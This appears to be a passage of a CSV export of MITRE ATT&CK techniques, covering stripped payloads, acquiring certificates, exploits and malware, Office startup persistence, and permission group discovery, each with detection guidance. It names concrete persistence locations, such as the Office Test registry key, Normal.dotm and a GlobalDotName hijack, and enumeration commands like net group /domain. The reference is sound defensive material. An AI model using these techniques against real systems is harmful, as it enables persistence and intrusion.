T1027.008,attack-pattern--2f41939b-54c3-41d6-8f8b-35f1ec18ed97,Obfuscated Files or Information: Stripped Payloads,"Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018)

Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.(Citation: SentinelLabs reversing run-only applescripts 2021)",https://attack.mitre.org/techniques/T1027/008,29 September 2022,20 October 2022,enterprise-attack,1.0,Defense Evasion,,"Linux, Windows, macOS",File: File Metadata,True,T1027,,,,,,,,"(Citation: SentinelLabs reversing run-only applescripts 2021),"
T1588.003,attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15,Obtain Capabilities: Code Signing Certificates,"Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.

Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",https://attack.mitre.org/techniques/T1588/003,01 October 2020,17 October 2021,enterprise-attack,1.1,Resource Development,"Consider analyzing code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, common name, and certificate authority. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in procuring code signing certificates.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as [Code Signing](https://attack.mitre.org/techniques/T1553/002) or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).",PRE,Malware Repository: Malware Metadata,True,T1588,,,,,,,,"(Citation: Symantec Palmerworm Sep 2020),(Citation: Bitdefender Sardonic Aug 2021),(Citation: ESET Lazarus Jun 2020),(Citation: Lunghi Iron Tiger Linux),(Citation: Mandiant FIN12 Oct 2021),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: IBM MegaCortex),"
T1588.004,attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421,Obtain Capabilities: Digital Certificates,"Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.

Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.

Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)

After obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",https://attack.mitre.org/techniques/T1588/004,01 October 2020,16 October 2021,enterprise-attack,1.2,Resource Development,"Consider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017) Some server-side components of adversary tools may have default values set for SSL/TLS certificates.(Citation: Recorded Future Beacon Certificates)

Detection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001), [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002), and/or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).",PRE,"Certificate: Certificate Registration, Internet Scan: Response Content",True,T1588,,,,,,,,"(Citation: Phish Labs Silent Librarian),(Citation: CISA AppleJeus Feb 2021),(Citation: ESET PLEAD Malware July 2018),(Citation: McAfee Honeybee),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: Kaspersky LuminousMoth July 2021),"
T1588.005,attack-pattern--f4b843c1-7e92-4701-8fed-ce82f8be2636,Obtain Capabilities: Exploits,"Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)

In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)

An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.

Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",https://attack.mitre.org/techniques/T1588/005,01 October 2020,15 April 2021,enterprise-attack,1.0,Resource Development,"
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",PRE,,True,T1588,,,,,,,,"(Citation: KISA Operation Muzabi),"
T1588.001,attack-pattern--7807d3a4-a885-4639-a786-c1ed41484970,Obtain Capabilities: Malware,"Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.

In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",https://attack.mitre.org/techniques/T1588/001,01 October 2020,17 October 2021,enterprise-attack,1.1,Resource Development,"Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific MaaS offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster.(Citation: FireEyeSupplyChain)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.",PRE,"Malware Repository: Malware Content, Malware Repository: Malware Metadata",True,T1588,,,,,,,,"(Citation: Proofpoint TA2541 February 2022),(Citation: SentinelLabs Metador Sept 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET Operation Spalax Jan 2021),(Citation: NSA NCSC Turla OilRig),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Mandiant APT1),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: NCC Group TA505),(Citation: FSI Andariel Campaign Rifle July 2017),(Citation: Recorded Future Turla Infra 2020),(Citation: McAfee Night Dragon),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Kaspersky LuminousMoth July 2021),(Citation: CrowdStrike AQUATIC PANDA December 2021),"
T1588.002,attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0,Obtain Capabilities: Tool,"Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)

Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",https://attack.mitre.org/techniques/T1588/002,01 October 2020,17 October 2021,enterprise-attack,1.1,Resource Development,"In some cases, malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.",PRE,Malware Repository: Malware Metadata,True,T1588,,Mnemonic AS; SOCCRATES,,,,,,"(Citation: Bitdefender Sardonic Aug 2021),(Citation: Bizeul 2014),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Cylance Cleaver),(Citation: Symantec Waterbug Jun 2019),(Citation: Mandiant FIN12 Oct 2021),(Citation: Lab52 WIRTE Apr 2019),(Citation: Microsoft GALLIUM December 2019),(Citation: Symantec Whitefly March 2019),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Microsoft Unidentified Dec 2018),(Citation: SecureWorks August 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: Mandiant APT41),(Citation: Securelist APT Trends Q2 2017),(Citation: NCSC Joint Report Public Tools),(Citation: FireEye APT19),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Talos Frankenstein June 2019),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: FireEye APT33 Guardrail),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Symantec Palmerworm Sep 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Kaspersky Carbanak),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: FireEye APT41 Aug 2019),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FireEye FIN10 June 2017),(Citation: Checkpoint IndigoZebra July 2021),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: IBM ITG07 June 2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: FireEye FIN6 Apr 2019),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Cisco Talos Avos Jun 2022),(Citation: Microsoft POLONIUM June 2022),(Citation: FireEye APT28 Hospitality Aug 2017),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: Securelist DarkVishnya Dec 2018),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: SecureList Silence Nov 2017),(Citation: SentinelLabs Metador Sept 2022),(Citation: BitDefender Chafer May 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Mandiant APT1),(Citation: Symantec Elfin Mar 2019),(Citation: ESET Lazarus KillDisk April 2018),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: NCC Group APT15 Alive and Strong),(Citation: FoxIT Wocao December 2019),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Cycraft Chimera April 2020),(Citation: Symantec Leafminer July 2018),(Citation: Palo Alto Sofacy 06-2018),(Citation: Proofpoint TA407 September 2019),(Citation: Cybereason Oceanlotus May 2017),(Citation: ClearSky and Trend Micro Operation Wilted Tulip July 2017),(Citation: Kaspersky Lyceum October 2021),(Citation: Check Point Rocket Kitten),(Citation: Mandiant FIN7 Apr 2022),(Citation: ESET Operation Spalax Jan 2021),(Citation: NCC Group LAPSUS Apr 2022),(Citation: FireEye APT29 Nov 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Night Dragon),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Mandiant No Easy Breach),(Citation: F-Secure The Dukes),(Citation: Securelist Sofacy Feb 2018),(Citation: NCC Group Chimera January 2021),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: BlackBerry CostaRicto November 2020),(Citation: Talos Kimsuky Nov 2021),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Volexity Patchwork June 2018),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Symantec Thrip June 2018),(Citation: NCC Group TA505),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Costa AvosLocker May 2022),(Citation: Cisco Operation Layover September 2021),(Citation: FireEye APT32 May 2017),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Symantec Tick Apr 2016),(Citation: FireEye TRITON 2019),(Citation: DFIR Phosphorus November 2021),(Citation: Anomali Static Kitten February 2021),(Citation: RedCanary Mockingbird May 2020),(Citation: Group IB Silence Aug 2019),(Citation: Dell TG-3390),(Citation: Secureworks IRON LIBERTY July 2019),(Citation: Microsoft Volt Typhoon May 2023),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: FireEye APT35 2018),"
T1588.006,attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327,Obtain Capabilities: Vulnerabilities,"Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)

An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",https://attack.mitre.org/techniques/T1588/006,15 October 2020,15 April 2021,enterprise-attack,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the potential use of exploits for vulnerabilities (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",PRE,,True,T1588,,,,,,,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),"
T1137.006,attack-pattern--34f1d81d-fe88-4f97-bd3b-a3164536255d,Office Application Startup: Add-ins,"Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)

Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. ",https://attack.mitre.org/techniques/T1137/006,07 November 2019,16 August 2021,enterprise-attack,1.1,Persistence,"Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.(Citation: GlobalDotName Jun 2019)(Citation: MRWLabs Office Persistence Add-ins)

Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior","Office 365, Windows","Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1137,,,"Administrator, User",,,,,"(Citation: CheckPoint Naikon May 2020),(Citation: Talos Bisonal Mar 2020),(Citation: win10_asr)"
T1137.001,attack-pattern--79a47ad0-fc3b-4821-9f01-a026b1ddba21,Office Application Startup: Office Template Macros,"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)

Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) 

Word Normal.dotm location:<br>
<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm</code>

Excel Personal.xlsb location:<br>
<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code>

Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\Program Files (x86)\Microsoft Office\root\Office16\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) 

An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",https://attack.mitre.org/techniques/T1137/001,07 November 2019,16 August 2021,enterprise-attack,1.1,Persistence,"Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)","Office 365, Windows","Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1137,,,"Administrator, User",,,,,"(Citation: Unit 42 BackConfig May 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Reaqta MuddyWater November 2017),(Citation: win10_asr),(Citation: MRWLabs Office Persistence Add-ins)"
T1137.002,attack-pattern--ed7efd4d-ce28-4a19-a8e6-c58011eb2c7a,Office Application Startup: Office Test,"Adversaries may abuse the Microsoft Office ""Office Test"" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)

There exist user and global Registry keys for the Office Test feature:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code>

Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",https://attack.mitre.org/techniques/T1137/002,07 November 2019,16 August 2021,enterprise-attack,1.1,Persistence,"Monitor for the creation of the Office Test Registry key. Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Since v13.52, Autoruns can detect tasks set up using the Office Test Registry key.(Citation: Palo Alto Office Test Sofacy)

Consider monitoring Office processes for anomalous DLL loads.","Office 365, Windows","Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1137,,,"Administrator, User",,"Office 2007, 2010, 2013, and 2016",,,"(Citation: Palo Alto Office Test Sofacy),(Citation: win10_asr),(Citation: Palo Alto Office Test Sofacy)"
T1137.003,attack-pattern--a9e2cea0-c805-4bf8-9e31-f5f0513a3634,Office Application Startup: Outlook Forms,"Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)

Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)",https://attack.mitre.org/techniques/T1137/003,07 November 2019,16 August 2021,enterprise-attack,1.1,Persistence,"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)

Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","Office 365, Windows","Application Log: Application Log Content, Command: Command Execution, Process: Process Creation",True,T1137,,,"Administrator, User",,,,,"(Citation: SensePost Ruler GitHub),(Citation: win10_asr),(Citation: SensePost Outlook Forms),(Citation: SensePost Outlook Home Page)"
T1137.004,attack-pattern--bf147104-abf9-4221-95d1-e81585859441,Office Application Startup: Outlook Home Page,"Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)

Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)
",https://attack.mitre.org/techniques/T1137/004,07 November 2019,16 August 2021,enterprise-attack,1.1,Persistence,"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)

Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","Office 365, Windows","Application Log: Application Log Content, Command: Command Execution, Process: Process Creation",True,T1137,,,"Administrator, User",,,,,"(Citation: FireEye Outlook Dec 2019),(Citation: SensePost Ruler GitHub),(Citation: win10_asr),(Citation: SensePost Outlook Forms),(Citation: SensePost Outlook Home Page)"
T1137.005,attack-pattern--3d1b9d7e-3921-4d25-845a-7d9f15c0da44,Office Application Startup: Outlook Rules,"Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)

Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)",https://attack.mitre.org/techniques/T1137/005,07 November 2019,15 October 2021,enterprise-attack,1.1,Persistence,"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) This PowerShell script is ineffective in gathering rules with modified `PRPR_RULE_MSG_NAME` and `PR_RULE_MSG_PROVIDER` properties caused by adversaries using a Microsoft Exchange Server Messaging API Editor (MAPI Editor), so only examination with the Exchange Administration tool MFCMapi can reveal these mail forwarding rules.(Citation: Pfammatter - Hidden Inbox Rules) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)

Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.","Office 365, Windows","Application Log: Application Log Content, Command: Command Execution, Process: Process Creation",True,T1137,,Microsoft Security,"Administrator, User",,,,,"(Citation: SensePost Ruler GitHub),(Citation: win10_asr),(Citation: SensePost Outlook Forms),(Citation: SensePost Outlook Home Page)"
T1069.003,attack-pattern--16e94db9-b5b1-4cd0-b851-f38fbd0a70f2,Permission Groups Discovery: Cloud Groups,"Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.

With authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).

Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)

Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",https://attack.mitre.org/techniques/T1069/003,21 February 2020,21 March 2023,enterprise-attack,1.4,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Activity and account logs for the cloud services can also be monitored for suspicious commands that are anomalous compared to a baseline of normal activity.","Azure AD, Google Workspace, IaaS, Office 365, SaaS","Application Log: Application Log Content, Command: Command Execution, Group: Group Enumeration, Group: Group Metadata, Process: Process Creation",True,T1069,,"Isif Ibrahima, Mandiant; Regina Elwell",,,,,,"(Citation: GitHub Pacu),(Citation: Roadtools),(Citation: AADInternals Documentation),(Citation: Crowdstrike TELCO BPO Campaign December 2022),"
T1069.002,attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c,Permission Groups Discovery: Domain Groups,"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.

Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",https://attack.mitre.org/techniques/T1069/002,21 February 2020,07 April 2023,enterprise-attack,1.2,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

